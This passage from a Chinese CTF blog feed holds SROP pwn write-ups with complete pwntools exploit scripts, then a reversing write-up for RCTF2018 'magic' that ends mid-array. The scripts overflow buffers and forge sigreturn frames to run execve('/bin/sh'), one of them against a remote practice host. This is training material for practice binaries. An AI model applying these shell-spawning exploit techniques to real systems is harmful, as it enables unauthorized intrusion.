<span class="token operator">+=</span> <span class="token punctuation">(</span><span class="token number">0x120</span> <span class="token operator">-</span> <span class="token builtin">len</span><span class="token punctuation">(</span>!<span class="token punctuation">[</span><span class="token number">2</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token operator">/</span>PWN<span class="token operator">-</span>SROP<span class="token operator">/</span><span class="token number">2</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">.</span>png<span class="token punctuation">)</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token string">'\x00'</span> <span class="token operator">+</span> <span class="token string">'/bin/sh\x00'</span> io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token number">8</span><span class="token operator">+</span><span class="token number">15</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment">#debug()</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="nkctf2023——ez-stack"><a href="#nkctf2023——ez-stack" class="headerlink" title="nkctf2023——ez_stack"></a>nkctf2023——ez_stack</h5><p>程序只开启了NX保护，且有syscall_ret</p><p><img src="/2023/04/08/pwn-srop/2-1.png"></p><p>我们发现有把eax赋值为0xf的操作，所以可以SROP</p><p><img src="/2023/04/08/pwn-srop/2-3.png"></p><p><img src="/2023/04/08/pwn-srop/2-2.png"></p><p><strong>exp1</strong></p><ul><li>把<code>/bin/sh/\x00</code>写入bss段上</li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>os <span class="token operator">=</span> <span class="token string">'linux'</span><span class="token punctuation">,</span> arch <span class="token operator">=</span> <span class="token string">'amd64'</span><span class="token punctuation">)</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./ez_stack"</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./ez_stack"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">debug</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">,</span> <span class="token string">"b *0x4011B9"</span><span class="token punctuation">)</span>bss <span class="token operator">=</span> elf<span class="token punctuation">.</span>bss<span class="token punctuation">(</span><span class="token punctuation">)</span>mov_rax <span class="token operator">=</span> <span class="token number">0x401146</span> <span class="token comment">#mov rax, 0xf ; ret</span>syscall <span class="token operator">=</span> <span class="token number">0x4011EE</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>bss<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#读取/bin/sh/\x00到bss段上</span>sigframe <span class="token operator">=</span> SigreturnFrame<span class="token punctuation">(</span><span class="token punctuation">)</span>sigframe<span class="token punctuation">.</span>rax <span class="token operator">=</span> <span class="token number">0</span>sigframe<span class="token punctuation">.</span>rdi <span class="token operator">=</span> <span class="token number">0</span>sigframe<span class="token punctuation">.</span>rsi <span class="token operator">=</span> bsssigframe<span class="token punctuation">.</span>rdx <span class="token operator">=</span> <span class="token number">0x200</span>sigframe<span class="token punctuation">.</span>rsp <span class="token operator">=</span> bss <span class="token operator">+</span> <span class="token number">8</span>sigframe<span class="token punctuation">.</span>rip <span class="token operator">=</span> syscallpayload <span class="token operator">=</span> <span class="token string">b'A'</span><span class="token operator">*</span><span class="token number">0x10</span> <span class="token operator">+</span> <span class="token string">b'deadbeef'</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>mov_rax<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>syscall<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>sigframe<span class="token punctuation">)</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sigframe <span class="token operator">=</span> SigreturnFrame<span class="token punctuation">(</span><span class="token punctuation">)</span>sigframe<span class="token punctuation">.</span>rax <span class="token operator">=</span> <span class="token number">59</span>sigframe<span class="token punctuation">.</span>rdi <span class="token operator">=</span> bsssigframe<span class="token punctuation">.</span>rsi <span class="token operator">=</span> <span class="token number">0</span>sigframe<span class="token punctuation">.</span>rdx <span class="token operator">=</span> <span class="token number">0</span>sigframe<span class="token punctuation">.</span>rip <span class="token operator">=</span> syscallpayload <span class="token operator">=</span> <span class="token string">b'/bin/sh\x00'</span> <span class="token operator">+</span> <span class="token string">b'deadbeef'</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>mov_rax<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>syscall<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>sigframe<span class="token punctuation">)</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token comment">#debug()</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>exp2</strong></p><ul><li>可以看到在下面的syscall之后，有一个 mov eax,0 的操作，所以我们直接跳到0x40011c8那就可以直接向<code>nkctf</code>的位置写入<code>/bin/sh\x00</code>字符串了</li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>os <span class="token operator">=</span> <span class="token string">'linux'</span><span class="token punctuation">,</span> arch <span class="token operator">=</span> <span class="token string">'amd64'</span><span class="token punctuation">)</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./ez_stack"</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./ez_stack"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">debug</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">,</span> <span class="token string">"b *0x4011B9"</span><span class="token punctuation">)</span>mov_rax <span class="token operator">=</span> <span class="token number">0x401146</span> <span class="token comment">#mov rax, 0xf ; ret</span>syscall <span class="token operator">=</span> <span class="token number">0x4011EE</span>binsh <span class="token operator">=</span>  <span class="token number">0x404040</span> <span class="token comment">#address of nkctf</span>payload <span class="token operator">=</span> <span class="token string">b'A'</span><span class="token operator">*</span><span class="token number">0x10</span> <span class="token operator">+</span> <span class="token string">b'deadbeef'</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x4011C8</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'/bin/sh\x00'</span><span class="token punctuation">)</span>sigframe <span class="token operator">=</span> SigreturnFrame<span class="token punctuation">(</span><span class="token punctuation">)</span>sigframe<span class="token punctuation">.</span>rax <span class="token operator">=</span> <span class="token number">59</span>sigframe<span class="token punctuation">.</span>rdi <span class="token operator">=</span> binshsigframe<span class="token punctuation">.</span>rsi <span class="token operator">=</span> <span class="token number">0</span>sigframe<span class="token punctuation">.</span>rdx <span class="token operator">=</span> <span class="token number">0</span>sigframe<span class="token punctuation">.</span>rip <span class="token operator">=</span> syscallpayload <span class="token operator">=</span> <span class="token string">b'A'</span><span class="token operator">*</span><span class="token number">0x10</span> <span class="token operator">+</span> <span class="token string">b'deadbeef'</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>mov_rax<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>syscall<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>sigframe<span class="token punctuation">)</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token comment">#debug()</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="buuctf——ciscn-2019-s-3"><a href="#buuctf——ciscn-2019-s-3" class="headerlink" title="buuctf——ciscn_2019_s_3"></a>buuctf——ciscn_2019_s_3</h5><ul><li>这道题跟nkctf2023-ez_satck几乎一样</li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>os <span class="token operator">=</span> <span class="token string">'linux'</span><span class="token punctuation">,</span> arch <span class="token operator">=</span> <span class="token string">'amd64'</span><span class="token punctuation">)</span><span class="token comment">#context.log_level = 'debug'</span><span class="token keyword">if</span> args<span class="token punctuation">[</span><span class="token string">"REMOTE"</span><span class="token punctuation">]</span><span class="token punctuation">:</span>io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node4.buuoj.cn'</span><span class="token punctuation">,</span> <span class="token number">26680</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./ciscn_s_3"</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./ciscn_s_3"</span><span class="token punctuation">)</span>bss <span class="token operator">=</span> elf<span class="token punctuation">.</span>bss<span class="token punctuation">(</span><span class="token punctuation">)</span>syscall_ret <span class="token operator">=</span> <span class="token number">0x400517</span>sigreturn <span class="token operator">=</span> <span class="token number">0x4004DA</span>sigframe <span class="token operator">=</span> SigreturnFrame<span class="token punctuation">(</span><span class="token punctuation">)</span>sigframe<span class="token punctuation">.</span>rax <span class="token operator">=</span> <span class="token number">0</span>sigframe<span class="token punctuation">.</span>rdi <span class="token operator">=</span> <span class="token number">0</span>sigframe<span class="token punctuation">.</span>rsi <span class="token operator">=</span> bsssigframe<span class="token punctuation">.</span>rdx <span class="token operator">=</span> <span class="token number">0x200</span>sigframe<span class="token punctuation">.</span>rsp <span class="token operator">=</span> bss <span class="token operator">+</span> <span class="token number">8</span>sigframe<span class="token punctuation">.</span>rip <span class="token operator">=</span> syscall_retpayload <span class="token operator">=</span> <span class="token string">b'A'</span><span class="token operator">*</span><span class="token number">0x10</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>sigreturn<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>syscall_ret<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>sigframe<span class="token punctuation">)</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sigframe <span class="token operator">=</span> SigreturnFrame<span class="token punctuation">(</span><span class="token punctuation">)</span>sigframe<span class="token punctuation">.</span>rax <span class="token operator">=</span> <span class="token number">59</span>sigframe<span class="token punctuation">.</span>rdi <span class="token operator">=</span> bsssigframe<span class="token punctuation">.</span>rsi <span class="token operator">=</span> <span class="token number">0</span>sigframe<span class="token punctuation">.</span>rdx <span class="token operator">=</span> <span class="token number">0</span>sigframe<span class="token punctuation">.</span>rip <span class="token operator">=</span> syscall_retpayload <span class="token operator">=</span> <span class="token string">b'/bin/sh\x00'</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>sigreturn<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>syscall_ret<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>sigframe<span class="token punctuation">)</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>当然这道题有mov rax,0x3B，并且后面write输出字节为0x30，而buf只有0x10大小且与rbp也只相差0x10，且rbp,rsp是重合的，所以可以泄漏栈地址，然后可以直接打ret2csu修改rdi、rsi、rdi的值(后面写ret2csu再写)</li></ul><p><img src="/2023/04/08/pwn-srop/3-1.png"></p><h5 id="rootersctf-2019-srop"><a href="#rootersctf-2019-srop" class="headerlink" title="rootersctf_2019_srop"></a>rootersctf_2019_srop</h5><ul><li>与上面题目套路一样</li></ul><p><img src="/2023/04/08/pwn-srop/4.png"></p><p>参考文章：</p><p><a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/advanced-rop/srop/">https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/advanced-rop/srop/</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF-PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF-PWN </tag>
            
            <tag> SROP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RCTF2018-magic</title>
      <link href="/2023/04/07/rctf2018-magic/"/>
      <url>/2023/04/07/rctf2018-magic/</url>
      
        <content type="html"><![CDATA[<blockquote><p><strong>涉及知识点</strong></p><blockquote><p>入口函数位置混淆</p></blockquote><blockquote><p>调用原始代码进行数据爆破</p></blockquote><blockquote><p>setjmp/longjmp机制</p></blockquote><blockquote><p>rc4密码算法</p></blockquote><blockquote><p>onexit机制</p></blockquote></blockquote><p>先运行发现输出错误信息</p><p><img src="/2023/04/07/rctf2018-magic/0.png"></p><p>IDA打开，分析main函数可知：在main函数前面还有其他函数(不是启动函数)，</p><ul><li>swap_xor利用异或交换数据，并且传入的是地址，所以swap_xor(&amp;v7, &amp;v7)返回0，而在main函数其他地方也没有发现有输出的地方，所以main函数不是入口函数</li><li>对main函数交叉引用跟踪到sub_4011B0函数</li></ul><p><img src="/2023/04/07/rctf2018-magic/1.png"></p><p>在sub_4011B0函数、main函数前分别下断点</p><ul><li>可以发现，main函数还没有执行，但报错信息已经输出</li></ul><p><img src="/2023/04/07/rctf2018-magic/2.png"></p><p>查看trace信息</p><ul><li>可以发现，在main函数前面sub_402218函数调用了puts函数，且sub_402357函数调用了sub_402218函数</li></ul><p><img src="/2023/04/07/rctf2018-magic/3.png"></p><p>跟到sub_402218函数</p><ul><li>可以看到该函数先对错误信息字符串解密，然后输出，再加密</li></ul><p><img src="/2023/04/07/rctf2018-magic/4.png"></p><p>对sub_402218交叉引用跟到sub_402357函数</p><ul><li>可以看到，当dword_4099D0[0]=0时，就会输出错误信息，所以在这里我们要让dword_4099D0[0]不等于0</li><li>跟进sub_402268函数，发现其对dword_4099D[0]进行了相关赋值</li></ul><p><img src="/2023/04/07/rctf2018-magic/5.png"></p><p>跟入sub_402268函数(这里我已经打好了补丁)</p><ul><li>该函数的原始逻辑是：srand(v2[1])，所以我们要爆破时间戳</li></ul><p><img src="/2023/04/07/rctf2018-magic/16.png"></p><p>爆破时间戳</p><ul><li><p>这里直接调用程序里面的sub_402268函数进行爆破；Note：要给sub_402268中的其他函数赋一个地址</p></li><li><p>time:5B00E398                 </p></li><li><p>dword_4099D0[0]: 322CE7A4</p></li></ul><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;#include&lt;string.h&gt;#include "crypt.h"#include&lt;Windows.h&gt;typedef unsigned int(*check_time)();static UINT time = 0x5AFFE78F + 1; //时间戳种子在(0x5AFFE78F,0x5B28A8F]之间UINT mytime(int) { //遍历时间戳return time++;}char byte_405020_bak[256] = { 0 };int main() {UINT64 * pTime64 = (UINT64 *)0x40A38C;UINT64 * pSrand  = (UINT64 *)0x40A414;UINT64 * pRand   = (UINT64 *)0x40A3FC;UINT64 * pMemset = (UINT64 *)0x40A3DC;HMODULE hmd = LoadLibrary(TEXT("your path\magic.exe"));memcpy(byte_405020_bak, (void*)0x405020, 256);check_time check = (check_time)0x402268;*pTime64 = (UINT64)mytime;*pSrand  = (UINT64)srand;*pRand   = (UINT64)rand;*pMemset = (UINT64)memset;while (TRUE) {memcpy((void*)0x405020, byte_405020_bak, 256);UINT res = check();if (res) {printf("time:%20X\ndword_4099D0[0]:%9X", time-1, res);break;}}return 0;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>给程序打个补丁</p><p><img src="/2023/04/07/rctf2018-magic/7.png"></p><p>打好补丁后，在运行程序</p><ul><li>此时，第一关已经攻破</li></ul><p><img src="/2023/04/07/rctf2018-magic/8.png"></p><p>保持sub_4011B0函数、main函数前的断点，再在sub_402268函数前下个断点，我们继续动态调试</p><ul><li>sub_402357执行完后，回到sub_4032A0函数</li></ul><p><img src="/2023/04/07/rctf2018-magic/9.png"></p><ul><li>继续往后跟，跟到sub_40318函数<ul><li>发现onexit()函数，这个函数的作用是注册一个函数，使得程序在exit()的时候会调这个被注册的函数，这个被注册的函数就是sub_403260</li></ul></li></ul><p><img src="/2023/04/07/rctf2018-magic/10.png"></p><ul><li>继续跟，会执行main函数，这里就不看了，因为main函数没啥用；main函数执行完后会调用exit函数(还记得上面的onexit🐎</li></ul><p><img src="/2023/04/07/rctf2018-magic/11.png"></p><ul><li>执行exit时，回调到sub_403260函数，这里跟进result就到都头了</li></ul><p><img src="/2023/04/07/rctf2018-magic/12.png"></p><ul><li>跟进sub_4023B1，这个函数就是上面的result，<ul><li>首先对我们的输入进行rc4加密(rc4的算法特征很明显</li><li>然后再进入虚拟机(sub_4029C7(data)函数)</li></ul></li></ul><p><img src="/2023/04/07/rctf2018-magic/13.png"></p><p>对虚拟机进行分析</p><ul><li><p>题型：给定了可执行程序和opcode，逆向emulator，结合opcode文件，推出flag</p></li><li><p>这个其实挺简单的，指令作用都特别明显</p></li><li><p>只是这里用了setjmp/longjmp机制(百度看一下，很简单)</p></li></ul><p><img src="/2023/04/07/rctf2018-magic/17.png"></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token triple-quoted-string string">"""0ABh, 3, 0     reg[3] = 00ABh, 4, 1Ah   reg[4] = 0x1A0ABh, 0, 'f'   reg[0] = 'f's1:0AAh, 5, 2     reg[5] = reg[2]0A9h, 'S'      reg[5] += reg[3]0A0h, 5        reg[5] = reg[5][0]0ABh, 6, 0CCh  reg[6] = 0xCC0A9h, 'V'      reg[5] += reg[6]0ABh, 6, 0FFh  reg[6] = 0xFF0ACh, 'V'      reg[5] &amp;= reg[6]0AEh, 'P'      reg[5] ^= reg[0]0ADh, 0        reg[0] = ~LOBYTE(reg[0])0AAh, 6, 5     reg[6] = reg[5]0AAh, 5, 1     reg[5] = reg[1]0A9h, 'S'      reg[5] += reg[3]0A0h, 5        reg[5] = reg[5][0]0AFh, 'V', 0             dword_409060 = 5;          dword_409064 = 6;          if ( !setjmp(::Buf) )            byte_405340[v7] = 5 / 0;  --&gt; 异常  --&gt; reg[5] =  reg[5] == reg[6]          v7 += 2;0A7h, 1        if reg[5]:          v7 += 1;        ++v7;        cmp reg[5] == 1        jz s20CCh s2:0A9h, '5'     reg[3] += reg[5]0AAh, 5, 3    reg[5] = reg[3]0AFh, 'T', 0           if ( !setjmp(::Buf) )            byte_405340[v7] = 5 / 0;  --&gt; 异常 --&gt; reg[5] =  reg[5] == reg[4]          v7 += 2;        0A6h, 0D1h        if reg[5] == 0:          v7 += 1;        ++v7;        cmp reg[5] == 1        jz s10CCh0, 0, 0, 0, 0, 0, 0"""</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>指令序列对应汇编</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token triple-quoted-string string">"""r1 = [  0x89, 0xC1, 0xEC, 0x50, 0x97, 0x3A, 0x57, 0x59, 0xE4, 0xE6,   0xE4, 0x42, 0xCB, 0xD9, 0x08, 0x22, 0xAE, 0x9D, 0x7C, 0x07,   0x80, 0x8F, 0x1B, 0x45, 0x04, 0xE8, 0x00, 0x00, 0x00, 0x00,   0x00, 0x00]r2 = rc4_inputmov r3, 0mov r4, 0x1Amov r0, 0x66s1:    mov r5, r2    add r5, r3    mov r5, byte ptr r5    mov r6, 0xCC    add r5, r6    mov r6, 0xFF    and r5, r6=0xFF    xor r5, r0    mov r0, ~LOBYTE(r0)    mov r6, r5    mov r5, r1    add r5, r3    mov r5, byte ptr r5    cmp r5, r6    jmp s2:    exits2:    add r3, r5    mov r5, r3    cmp r5, r4    jmp s1    exit"""</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>指令序列对应python代码</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">rc4_input <span class="token operator">=</span> <span class="token string">"abcdefg"</span>r0 <span class="token operator">=</span> <span class="token number">0x66</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>rc4_input<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    r6 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>rc4_input<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">0xCC</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span> <span class="token operator">^</span> r0    r0 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token operator">~</span>r0<span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">0xFF</span>    <span class="token keyword">if</span> r1<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">!=</span> r6<span class="token punctuation">:</span> <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>直接爆破rc4_input：</p><ul><li>得到238cbefd25d765f4b6b3b6fe174a2effc384ed21a4ab11096a5</li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python">r0 <span class="token operator">=</span> <span class="token number">0x66</span>r1 <span class="token operator">=</span> <span class="token punctuation">[</span>  <span class="token number">0x89</span><span class="token punctuation">,</span> <span class="token number">0xC1</span><span class="token punctuation">,</span> <span class="token number">0xEC</span><span class="token punctuation">,</span> <span class="token number">0x50</span><span class="token punctuation">,</span> <span class="token number">0x97</span><span class="token punctuation">,</span> <span class="token number">0x3A</span><span class="token punctuation">,</span> <span class="token number">0x57</span><span class="token punctuation">,</span> <span class="token number">0x59</span><span class="token punctuation">,</span> <span class="token number">0xE4</span><span class="token punctuation">,</span> <span class="token number">0xE6</span><span class="token punctuation">,</span>   <span class="token number">0xE4</span><span class="token punctuation">,</span> <span class="token number">0x42</span><span class="token punctuation">,</span> <span class="token number">0xCB</span><span class="token punctuation">,</span> <span class="token number">0xD9</span><span class="token punctuation">,</span> <span class="token number">0x08</span><span class="token punctuation">,</span> <span class="token number">0x22</span><span class="token punctuation">,</span> <span class="token number">0xAE</span><span class="token punctuation">,</span> <span class="token number">0x9D</span><span class="token punctuation">,</span> <span class="token number">0x7C</span><span class="token punctuation">,</span> <span class="token number">0x07</span><span class="token punctuation">,</span>   <span class="token number">0x80</span><span class="token punctuation">,</span> <span class="token number">0x8F</span><span class="token punctuation">,</span> <span class="token number">0x1B</span><span class="token punctuation">,</span> <span class="token number">0x45</span><span class="token punctuation">,</span> <span class="token number">0x04</span><span class="token punctuation">,</span> <span class="token number">0xE8</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span>   <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">]</span>rc4_input <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">input</span> <span class="token operator">=</span> <span class="token string">""</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">26</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        r <span class="token operator">=</span>  <span class="token punctuation">(</span><span class="token punctuation">(</span>j <span class="token operator">+</span> <span class="token number">0xCC</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span> <span class="token operator">^</span> r0        <span class="token keyword">if</span> r1<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> r<span class="token punctuation">:</span>            rc4_input<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">break</span>    r0 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token operator">~</span>r0<span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">0xFF</span><span class="token keyword">for</span> i <span class="token keyword">in</span> rc4_input<span class="token punctuation">:</span>    <span class="token builtin">input</span> <span class="token operator">+=</span> i<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后直接rc4解密就行：密钥就是前面的dword_4099D0[0]，这里采用大佬的方法直接修改内存数据取解密，因为不知道dword_4099D0[0]有没有在其他地方改改，所以这样其实更加保险</p><p>脚本如下:</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> idaapi <span class="token keyword">import</span> <span class="token operator">*</span>rc4 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x23</span><span class="token punctuation">,</span><span class="token number">0x8c</span><span class="token punctuation">,</span><span class="token number">0xbe</span><span class="token punctuation">,</span><span class="token number">0xfd</span><span class="token punctuation">,</span><span class="token number">0x25</span><span class="token punctuation">,</span><span class="token number">0xd7</span><span class="token punctuation">,</span><span class="token number">0x65</span><span class="token punctuation">,</span><span class="token number">0xf4</span><span class="token punctuation">,</span><span class="token number">0xb6</span><span class="token punctuation">,</span><span class="token number">0xb3</span><span class="token punctuation">,</span><span class="token number">0xb6</span><span class="token punctuation">,</span><span class="token number">0xf</span><span class="token punctuation">,</span><span class="token number">0xe1</span><span class="token punctuation">,</span><span class="token number">0x74</span><span class="token punctuation">,</span><span class="token number">0xa2</span><span class="token punctuation">,</span><span class="token number">0xef</span><span class="token punctuation">,</span><span class="token number">0xfc</span><span class="token punctuation">,</span><span class="token number">0x38</span><span class="token punctuation">,</span><span class="token number">0x4e</span><span class="token punctuation">,</span><span class="token number">0xd2</span><span class="token punctuation">,</span><span class="token number">0x1a</span><span class="token punctuation">,</span><span class="token number">0x4a</span><span class="token punctuation">,</span><span class="token number">0xb1</span><span class="token punctuation">,</span><span class="token number">0x10</span><span class="token punctuation">,</span><span class="token 